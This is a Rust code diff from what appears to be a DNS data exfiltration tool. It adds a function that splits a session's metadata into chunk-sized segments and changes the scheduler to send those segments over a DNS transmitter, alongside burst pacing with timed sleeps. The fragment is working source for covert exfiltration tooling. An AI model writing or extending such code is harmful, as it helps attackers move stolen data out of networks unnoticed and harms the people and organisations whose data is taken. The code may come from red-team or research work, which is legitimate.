@@ -1,5 +1,5 @@
 use crate::config::Config;
-use crate::dns::DnsTransmitter;
+use crate::dns::{build_metadata_payload, DnsTransmitter};
 use crate::metadata::ExfilSession;
 use anyhow::Result;
 use rand::Rng;
@@ -16,8 +16,12 @@ impl ChunkScheduler {
     }
 
     pub fn run(&self, session: &mut ExfilSession, transmitter: &mut DnsTransmitter) -> Result<()> {
+        let metadata_payload = build_metadata_payload(session);
+        let metadata_segments = split_metadata_segments(&metadata_payload, session.job.chunk_size);
+        session.set_metadata_frames(metadata_segments.len());
+
         transmitter.send_header(session)?;
-        transmitter.send_metadata_chunk(session)?;
+        transmitter.send_metadata_segments(session, &metadata_segments)?;
 
         let mut chunks_in_burst = 0usize;
         while session.next_chunk < session.job.total_chunks {
@@ -57,4 +61,16 @@ impl ChunkScheduler {
             thread::sleep(Duration::from_millis(total));
         }
     }
+}
+
+fn split_metadata_segments(payload: &[u8], chunk_size: usize) -> Vec<Vec<u8>> {
+    let segment_size = chunk_size.max(1);
+    if payload.is_empty() {
+        return vec![Vec::new()];
+    }
+
+    payload
+        .chunks(segment_size)
+        .map(|chunk| chunk.to_vec())
+        .collect()
 }
